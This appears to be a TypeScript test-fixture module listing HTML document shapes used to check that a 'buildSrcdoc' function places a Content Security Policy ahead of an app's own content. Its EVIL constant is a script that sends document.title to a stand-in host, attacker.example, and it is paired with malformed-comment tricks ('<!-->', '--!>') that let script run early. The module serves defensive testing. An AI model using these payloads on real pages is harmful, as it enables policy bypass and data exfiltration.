/**
 * The app-document shapes `buildSrcdoc` has to survive (rulings P3-R16, P3-R22).
 *
 * They live here, apart from the spec, because two things check them: the unit
 * suite, which asserts the *string* `buildSrcdoc` produces, and
 * `scripts/browser-check.mjs` (ruling P4-R22), which loads each one in a real
 * headless Chrome and asks the browser's own parser where the policy ended up.
 * A shape added for one is then covered by both, which is the point — the unit
 * suite can only ever check what we believe the parser will do with a string.
 *
 * This module is imported by a plain `.mjs` script through Node's type
 * stripping, so it must stay free of imports and of anything but erasable
 * syntax.
 */
export interface SrcdocCase {
  /** What this shape is, named for a failure message. */
  name: string;
  /** The app's own document, exactly as it would be stored. */
  source: string;
  /**
   * A distinctive slice of the app's own content, as a browser serialises it
   * back out — the thing the policy must be parsed before. Null for a document
   * that ships no content of its own.
   */
  marker: string | null;
  /** What the built document must start with, where the shape pins it (the doctype rules). */
  prefix?: string;
}

const EVIL = "<script>fetch('https://attacker.example/?'+document.title)</script>";

/** The everyday shapes: a full document, a fragment, a bare script, nothing at all. */
export const DOCUMENT_SHAPES: SrcdocCase[] = [
  { name: "full document", source: "<!doctype html><html><head><title>x</title></head><body>hi</body></html>", marker: "<title>x</title>" },
  { name: "html and body only", source: "<html><body>hi</body></html>", marker: "hi" },
  { name: "body only", source: "<body>hi</body>", marker: "hi" },
  // The script is inert on purpose: `alert()` opens a modal that headless
  // Chrome does not dismiss, so the browser check would hang on it rather than
  // report anything. What this shape is about is a document that is *only* a
  // script, which holds either way.
  { name: "bare script", source: "<script>window.__appRan = 1</script>", marker: "window.__appRan" },
  { name: "empty", source: "", marker: null },
];

/** Only a leading doctype may precede our head, and it must stay leading. */
export const LEADING_DOCTYPE: SrcdocCase[] = [
  { name: "uppercase doctype", source: "<!DOCTYPE html><body>hi</body>", marker: "hi", prefix: "<!DOCTYPE html><head><meta" },
  { name: "doctype after ASCII whitespace", source: "  <!doctype html>\n<html><body>hi</body></html>", marker: "hi", prefix: "  <!doctype html><head><meta" },
  // A doctype that is not first is app content like any other: it stays put
  // (the document then parses in quirks mode, which is the app's own doing).
  { name: "comment before the doctype", source: "<!-- note --><!doctype html><html><head><title>x</title></head></html>", marker: "<title>x</title>", prefix: "<head><meta" },
];

/**
 * Ruling P3-R22. The HTML tokenizer's whitespace is exactly `[\t\n\f\r ]`;
 * JavaScript's `\s` also matches each of these. Placed ahead of the doctype,
 * none of them may count as an inert prefix — the doctype is then not
 * "leading", so our head goes first and the whitespace plus doctype become
 * harmless body text. Covers U+00A0, U+000B, U+2028, U+2029, U+3000, and a BOM
 * that is not the very first byte (introduced here by a preceding LF).
 */
export const UNICODE_WHITESPACE: SrcdocCase[] = [" ", "", " ", " ", "　", "\n﻿"].map((prefix, index) => ({
  name: `unicode whitespace ${index + 1} before the doctype`,
  source: `${prefix}<!doctype html><html><body>hi</body></html>`,
  marker: "hi",
  prefix: "<head><meta",
}));

/**
 * `--!>` ends a comment ("incorrectly-closed-comment") and `<!-->` / `<!--->`
 * are complete empty comments ("abrupt-closing-of-empty-comment"), so a
 * "leading comment" can hold script that runs before any later head.
 */
export const EARLY_CLOSED_COMMENTS: SrcdocCase[] = [
  { name: "abrupt empty comment", source: `<!-->${EVIL}<html><head><title>x</title></head><body></body></html>`, marker: "attacker.example" },
  { name: "abrupt empty comment, three dashes", source: `<!--->${EVIL}<head></head><body></body>`, marker: "attacker.example" },
  { name: "incorrectly closed comment", source: `<!-- a --!>${EVIL}<!-- b --><html><head></head><body></body></html>`, marker: "attacker.example" },
  { name: "incorrectly closed comment, body only", source: `<!-- a --!>${EVIL}<body>hi</body>`, marker: "attacker.example" },
];

/**
 * A policy spliced into `<header>` or `<html-viewer>` would land in the body,
 * where the parser ignores it (HTML §4.2.5.3) and the app would run with no CSP
 * at all; an app's own `<head>` children are simply re-parented into the head
 * we opened first.
 */
export const APP_OWN_HEAD: SrcdocCase[] = [
  { name: "header element", source: "<header>hi</header>", marker: "<header>" },
  { name: "uppercase header element", source: "<HEADER>hi</HEADER>", marker: "<header>" },
  { name: "header inside html", source: "<html><header>hi</header></html>", marker: "<header>" },
  { name: "custom element starting with html-", source: "<html-viewer>hi</html-viewer>", marker: "<html-viewer>" },
  { name: "the app's own head", source: "<html><head><meta charset=\"utf-8\"><title>x</title></head></html>", marker: "<title>x</title>" },
];

export const ALL_SRCDOC_CASES: SrcdocCase[] = [
  ...DOCUMENT_SHAPES,
  ...LEADING_DOCTYPE,
  ...UNICODE_WHITESPACE,
  ...EARLY_CLOSED_COMMENTS,
  ...APP_OWN_HEAD,
];
